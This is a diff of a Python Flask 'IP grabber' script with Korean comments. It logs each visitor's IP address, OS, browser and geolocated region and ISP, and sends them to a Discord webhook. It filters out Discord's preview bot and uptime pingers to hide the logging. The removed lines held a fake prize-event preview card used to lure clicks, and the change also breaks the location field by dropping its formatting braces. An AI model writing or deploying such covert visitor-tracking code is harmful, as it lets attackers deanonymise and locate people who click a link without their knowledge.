@@ -15,21 +15,16 @@ DISCORD_WEBHOOK_URL_IP = "https://discord.com/api/webhooks/1547879120195821639/3
 TARGET_URL = "https://weao.xyz"
 last_status = None
 
-# 🔥 디스코드 깔끔한 미리보기 카드 HTML (요청한 문구 및 새 이미지 적용)
-PREVIEW_HTML = """
+# 🔥 미리보기 없는 순수 빈 HTML (OG 태그 제거)
+NO_PREVIEW_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <title>특별 이벤트</title>
-    <!-- 디스코드 카드 미리보기를 조작하는 Open Graph 태그 -->
-    <meta property="og:title" content="특별 이벤트!">
-    <meta property="og:description" content="행운의 5000원 당첨자는?">
-    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgT7bYAo-NoJU45WXYSFrbBtmLxidZujGW2kvBHwAjBg&s=10">
-    <meta property="og:type" content="website">
+    <title>Loading...</title>
 </head>
 <body style="background-color: #111; color: #fff; text-align: center; padding-top: 50px;">
-    <h2>로딩 중입니다... 잠시만 기다려주세요.</h2>
+    <h2>로딩 중입니다...</h2>
 </body>
 </html>
 """
@@ -66,15 +61,15 @@ def monitor_potassium():
             
         time.sleep(60)
 
-# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 + OG 태그 적용)
+# 2. 웹서버 접속 시 IP 및 브라우저 정보 로깅 (핑 봇 자동 필터링 + 미리보기 없음)
 @app.route('/')
 def catch_ip():
     user_agent = request.headers.get('User-Agent', 'N/A')
     
-    # 디스코드 미리보기 봇이 긁어갈 때는 OG 태그가 담긴 HTML을 보여줌 (웹훅 안 쏨)
+    # 디스코드 미리보기 봇이 올 때는 메타태그가 없는 기본 페이지만 던져줌으로써 미리보기 차단
     if "Discordbot" in user_agent:
-        print("[!] 디스코드 미리보기 봇이 이미지를 긁어감")
-        return render_template_string(PREVIEW_HTML)
+        print("[!] 디스코드 봇 차단 (미리보기 안 뜸)")
+        return render_template_string(NO_PREVIEW_HTML)
 
     if request.headers.get('X-Forwarded-For'):
         user_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
@@ -120,10 +115,10 @@ def catch_ip():
     elif "Safari/" in user_agent and "Chrome/" not in user_agent:
         browser_info = "Safari"
 
-    # UptimeRobot 같은 핑 봇은 차단하고 미리보기 HTML 리턴
+    # UptimeRobot 같은 핑 봇은 차단
     if os_info == "기타 OS" and browser_info == "기타 브라우저":
         print(f"[!] 핑 봇 접속 차단됨 (IP: {user_ip})")
-        return render_template_string(PREVIEW_HTML)
+        return render_template_string(NO_PREVIEW_HTML)
 
     # IP 주소로 대략적인 지역 및 통신사 조회 (ip-api 이용)
     location_info = "조회 불가"
@@ -150,7 +145,7 @@ def catch_ip():
                 "fields": [
                     {"name": "IP 주소", "value": f"`{user_ip}`", "inline": True},
                     {"name": "시간", "value": f"`{timestamp}`", "inline": True},
-                    {"name": "지역/통신사", "value": f"`{location_info}`", "inline": False},
+                    {"name": "지역/통신사", "value": f"`location_info`", "inline": False},
                     {"name": "운영체제", "value": f"`{os_info}`", "inline": True},
                     {"name": "브라우저", "value": f"`{browser_info}`", "inline": True}
                 ]
@@ -163,7 +158,7 @@ def catch_ip():
     except Exception as e:
         print(f"[!] 디스코드 웹훅 에러 발생 : {e}")
     
-    return render_template_string(PREVIEW_HTML)
+    return render_template_string(NO_PREVIEW_HTML)
 
 if __name__ == '__main__':
     # 백그라운드 포타슘 감시 스레드 실행
